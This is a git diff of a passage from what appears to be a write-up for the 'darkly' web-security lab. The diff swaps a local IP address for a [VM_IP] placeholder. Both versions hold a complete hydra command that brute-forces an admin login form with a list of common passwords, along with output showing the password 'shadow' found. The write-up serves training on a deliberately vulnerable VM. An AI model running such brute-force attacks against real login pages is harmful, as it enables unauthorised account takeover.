@@ -6,15 +6,15 @@ From coookies we know for sure that there is a user with login `admin`. Let's tr
 We use `hydra` to iterate through them:
 
 ```
-daiseed@DESKTOP:~/darkly$ hydra -l admin -P ./500-worst-passwords.txt -F 192.168.31.135 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
+daiseed@DESKTOP:~/darkly$ hydra -l admin -P ./500-worst-passwords.txt -F [VM_IP] http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
 
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-18 01:03:36
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
-[DATA] attacking http-get-form://192.168.31.135:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
-[80][http-get-form] host: 192.168.31.135   login: admin   password: shadow
-[STATUS] attack finished for 192.168.31.135 (valid pair found)
+[DATA] attacking http-get-form://[VM_IP]:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
+[80][http-get-form] host: [VM_IP]   login: admin   password: shadow
+[STATUS] attack finished for [VM_IP] (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-18 01:03:43
 ```
